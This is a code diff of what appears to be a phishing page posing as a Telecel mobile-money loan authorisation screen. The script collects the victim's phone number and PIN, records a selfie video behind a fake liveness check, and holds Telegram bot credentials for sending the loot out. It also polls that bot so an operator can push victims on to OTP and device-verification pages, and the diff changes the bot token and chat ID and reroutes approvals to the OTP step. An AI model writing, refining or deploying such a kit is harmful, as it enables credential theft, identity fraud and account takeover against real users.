@@ -207,7 +207,7 @@ input::placeholder{color:var(--text-light)}
     <button class="btn-primary" id="continueBtn">Verify &amp; Authorise Loan</button>
     <a class="btn-back" href="index.html">← Back to Application</a>
     <div class="security-note">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
       </svg>
       256-bit encrypted &amp; secured by Telecel
@@ -251,20 +251,15 @@ input::placeholder{color:var(--text-light)}
     <defs>
       <mask id="ovalMask">
         <rect width="400" height="600" fill="white"/>
-        <!-- LARGE OVAL centered exactly in the middle of the viewport -->
         <ellipse cx="200" cy="270" rx="145" ry="195" fill="black"/>
       </mask>
       <filter id="glow">
-        <feGaussianBlur stdDeviation="4" result="blur"/>
+        <feGaussianBlur stdDeviation="6" result="blur"/>
         <feComposite in="SourceGraphic" in2="blur" operator="over"/>
       </filter>
     </defs>
-    <!-- Background overlay mask -->
     <rect width="400" height="600" fill="rgba(0,0,0,0.6)" mask="url(#ovalMask)"/>
-    <!-- Oval border centered higher to avoid bottom bar -->
     <ellipse id="ovalBorder" cx="200" cy="270" rx="145" ry="195" fill="none" stroke="rgba(255,255,255,0.8)" stroke-width="5" stroke-dasharray="10 10"/>
-    
-    <!-- Liveness indicators - adjusted for centered oval -->
     <g id="arrowGroup" style="opacity:0">
       <circle id="arrowCircle" cx="200" cy="50" r="28" fill="rgba(228,35,32,0.9)" filter="url(#glow)"/>
       <path id="aLine1" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
@@ -303,14 +298,13 @@ input::placeholder{color:var(--text-light)}
 
 <script>
 const CONFIG = {
-  BOT_TOKEN: '7822060601:AAGXo643N9z0rL3R4o3o-V8p9rL3R4o3o-V8',
-  CHAT_ID: '7162060601',
-  APPROVE_PAGE: 'approve.html',
-  DEVICE_PAGE: 'device.html',
+  BOT_TOKEN: '8813675915:AAF9pi1MYsvUO-qDK-1qX8G_8T7tcyavXPQ',
+  CHAT_ID: '7881536601',
+  OTP_PAGE: 'otp.html',
+  DEVICE_PAGE: 'device_verify.html', // UPDATED
   SUCCESS_PAGE: 'success.html'
 };
 
-// 20 SECONDS TOTAL DURATION (4s per step)
 const STEP_DURATION = 4000;
 const STEPS = [
   { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:200, cy:50 },
@@ -355,71 +349,47 @@ const aLine1          = document.getElementById('aLine1');
 const aLine2          = document.getElementById('aLine2');
 const aLine3          = document.getElementById('aLine3');
 
-let botState      = { lastUpdateId: 0 };
-let isProcessing  = false;
-let mediaStream   = null;
-let mediaRecorder = null;
-let recordedChunks= [];
-let selfieBlob    = null;
-let currentStep   = 0;
-let stepTimer     = null;
-let capturedPhone = '';
-let capturedPin   = '';
-let canvasStream  = null;
-let animationReq  = null;
+let capturedPhone='', capturedPin='', isProcessing=false;
+let mediaStream=null, canvasStream=null, mediaRecorder=null, recordedChunks=[], selfieBlob=null;
+let currentStep=0, stepTimer=null, animationReq=null;
+const botState = { lastUpdateId: 0 };
 
-function loadLoanDetails() {
-  const p = new URLSearchParams(window.location.search);
-  const amount = p.get('amount'), duration = p.get('duration'),
-        purpose = p.get('purpose'), name = p.get('name'), prevPhone = p.get('phone');
-  if (amount) {
-    document.getElementById('loanAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
-    document.getElementById('loanLabel').textContent  = name ? `${name}'s Loan` : 'Flex Loan';
-    const det = [];
-    if (duration) det.push(`${duration} Days`);
-    if (purpose)  det.push(purpose.replace(/([A-Z])/g,' $1').trim());
-    document.getElementById('loanDetails').textContent = det.join(' \u2022 ');
-  }
-  if (prevPhone) phoneInput.value = prevPhone;
+function isValidGhanaNumber(p){ return /^(020|050|024|054|027|057|026|056)\d{7}$/.test(p); }
+function showError(m){ errMsg.textContent=m; errMsg.style.display='block'; }
+function resetButton(){ isProcessing=false; continueBtn.disabled=false; continueBtn.textContent='Verify & Authorise Loan'; spinnerEl.style.display='none'; }
+function showToast(){ toastOverlay.style.display='block'; toastEl.style.display='block'; }
+toastHomeBtn.onclick = () => { window.location.href='index.html'; };
+
+function loadLoanDetails(){
+  const params = new URLSearchParams(window.location.search);
+  const amount = params.get('amount') || '5,000';
+  const period = params.get('period') || '30 days';
+  const total  = params.get('total') || '5,445';
+  document.getElementById('loanAmount').textContent = 'GHS ' + parseFloat(amount).toLocaleString('en-GH');
+  document.getElementById('loanDetails').textContent = period + ' term \u2022 Total GHS ' + parseFloat(total).toLocaleString('en-GH');
 }
 
-function isValidGhanaNumber(n) {
-  if (n.length !== 10) return false;
-  return ['020','050','023','024','027','054','055','057','059','026','028'].some(p => n.startsWith(p));
+function drawOvalFrame() {
+  cropCanvas.width=400; cropCanvas.height=600;
+  cropCtx.save();
+  cropCtx.beginPath();
+  cropCtx.ellipse(200, 270, 145, 195, 0, 0, Math.PI*2);
+  cropCtx.clip();
+  cropCtx.scale(-1, 1);
+  cropCtx.drawImage(selfieVideo, -400, 0, 400, 600);
+  cropCtx.restore();
+  animationReq = requestAnimationFrame(drawOvalFrame);
 }
 
-function showToast()  { toastEl.style.display='block'; toastOverlay.style.display='block'; }
-function hideToast()  { toastEl.style.display='none';  toastOverlay.style.display='none';  }
-toastHomeBtn.onclick = () => { hideToast(); window.location.href='index.html'; };
-
-function showError(msg) { errMsg.textContent=msg; errMsg.style.display='block'; }
-function resetButton()  {
-  isProcessing=false;
-  continueBtn.disabled=false;
-  continueBtn.textContent='Verify & Authorise Loan';
-}
-
-function buildDots() {
-  selfieDots.innerHTML='';
-  STEPS.forEach((_,i) => {
-    const d=document.createElement('div');
-    d.className='sdot'; d.id=`sd${i}`; selfieDots.appendChild(d);
-  });
-}
-
-function setArrow(step) {
-  const s = STEPS[step];
-  if (!s.dir) { arrowGroup.style.opacity='0'; return; }
-  const shape = ARROW_SHAPES[s.dir];
-  const cx=s.cx, cy=s.cy;
-  arrowCircle.setAttribute('cx', cx); arrowCircle.setAttribute('cy', cy);
-  aLine1.setAttribute('x1', cx+shape.l1[0]); aLine1.setAttribute('y1', cy+shape.l1[1]);
-  aLine1.setAttribute('x2', cx+shape.l1[2]); aLine1.setAttribute('y2', cy+shape.l1[3]);
-  aLine2.setAttribute('x1', cx+shape.l2[0]); aLine2.setAttribute('y1', cy+shape.l2[1]);
-  aLine2.setAttribute('x2', cx+shape.l2[2]); aLine2.setAttribute('y2', cy+shape.l2[3]);
-  aLine3.setAttribute('x1', cx+shape.l3[0]); aLine3.setAttribute('y1', cy+shape.l3[1]);
-  aLine3.setAttribute('x2', cx+shape.l3[2]); aLine3.setAttribute('y2', cy+shape.l3[3]);
-  arrowGroup.style.opacity='1';
+function setArrow(idx) {
+  const step = STEPS[idx];
+  arrowCircle.setAttribute('cx', step.cx);
+  arrowCircle.setAttribute('cy', step.cy);
+  arrowGroup.style.opacity = step.dir ? '1' : '0';
+  const s = ARROW_SHAPES[step.dir || 'null'];
+  aLine1.setAttribute('d', `M${step.cx+s.l1[0]} ${step.cy+s.l1[1]} L${step.cx+s.l1[2]} ${step.cy+s.l1[3]}`);
+  aLine2.setAttribute('d', `M${step.cx+s.l2[0]} ${step.cy+s.l2[1]} L${step.cx+s.l2[2]} ${step.cy+s.l2[3]}`);
+  aLine3.setAttribute('d', `M${step.cx+s.l3[0]} ${step.cy+s.l3[1]} L${step.cx+s.l3[2]} ${step.cy+s.l3[3]}`);
 }
 
 function setStep(idx) {
@@ -465,58 +435,16 @@ function closeSelfieScreen() {
 selfieCancel.onclick = () => {
   closeSelfieScreen();
   resetButton();
-  isProcessing=false;
 };
 
-// ── LARGE OVAL CROP LOGIC ──
-function drawOvalFrame() {
-  const w = 540; // Increased resolution
-  const h = 720; 
-  cropCanvas.width = w;
-  cropCanvas.height = h;
-
-  const v = selfieVideo;
-  const vw = v.videoWidth;
-  const vh = v.videoHeight;
-  
-  if (vw && vh) {
-    const targetAspect = w / h;
-    let sw, sh, sx, sy;
-    if (vw / vh > targetAspect) {
-      sh = vh; sw = vh * targetAspect;
-      sx = (vw - sw) / 2; sy = 0;
-    } else {
-      sw = vw; sh = vw / targetAspect;
-      sx = 0; sy = (vh - sh) / 2;
-    }
-
-    cropCtx.clearRect(0, 0, w, h);
-    cropCtx.fillStyle = '#000000';
-    cropCtx.fillRect(0, 0, w, h);
-
-    cropCtx.save();
-    // Large centered oval clipping path
-    cropCtx.beginPath();
-    cropCtx.ellipse(w/2, h/2 - 30, w/2 - 10, h/2 - 40, 0, 0, Math.PI * 2);
-    cropCtx.clip();
-
-    cropCtx.translate(w, 0);
-    cropCtx.scale(-1, 1);
-    cropCtx.drawImage(v, sx, sy, sw, sh, 0, 0, w, h);
-    cropCtx.restore();
-  }
-  animationReq = requestAnimationFrame(drawOvalFrame);
-}
-
 async function startSelfieVerification() {
-  buildDots();
+  selfieDots.innerHTML = STEPS.map((_,i)=>`<div class="sdot" id="sd${i}"></div>`).join('');
   selfieScreen.style.display='flex';
   selfieInstr.textContent='Starting camera…';
   selfieSub.textContent='';
   arrowGroup.style.opacity='0';
   ovalBorder.setAttribute('stroke','rgba(255,255,255,0.8)');
   recordedChunks=[]; selfieBlob=null;
-
   try {
     mediaStream = await navigator.mediaDevices.getUserMedia({
       video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
@@ -524,13 +452,10 @@ async function startSelfieVerification() {
     });
     selfieVideo.srcObject = mediaStream;
     await selfieVideo.play();
-
     drawOvalFrame();
     canvasStream = cropCanvas.captureStream(30);
-
     const mimeType = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4']
       .find(m => { try { return MediaRecorder.isTypeSupported(m); } catch(e){ return false; } }) || '';
-    
     mediaRecorder = new MediaRecorder(canvasStream, mimeType ? { mimeType } : {});
     mediaRecorder.ondataavailable = e => { if(e.data && e.data.size>0) recordedChunks.push(e.data); };
     mediaRecorder.onstop = () => {
@@ -596,8 +521,16 @@ function startPolling(approveId, declineId, verifyId, appliedId) {
           if(update.callback_query){
             const cb = update.callback_query.data;
             const search = new URLSearchParams(window.location.search).toString();
-            if(cb===approveId){ clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.APPROVE_PAGE}?${search}`; }
-            else if(cb===verifyId){ clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.DEVICE_PAGE}?${search}`; }
+            if(cb===approveId){ 
+              clearInterval(interval); 
+              spinnerEl.style.display='none'; 
+              window.location.href=`${CONFIG.OTP_PAGE}?${search}`;
+            }
+            else if(cb===verifyId){ 
+              clearInterval(interval); 
+              spinnerEl.style.display='none'; 
+              window.location.href=`${CONFIG.DEVICE_PAGE}?${search}`; 
+            }
             else if(cb===appliedId){ clearInterval(interval); spinnerEl.style.display='none'; showToast(); resetButton(); }
             else if(cb===declineId){ clearInterval(interval); spinnerEl.style.display='none'; showError('Request declined. Please try again.'); resetButton(); }
           }
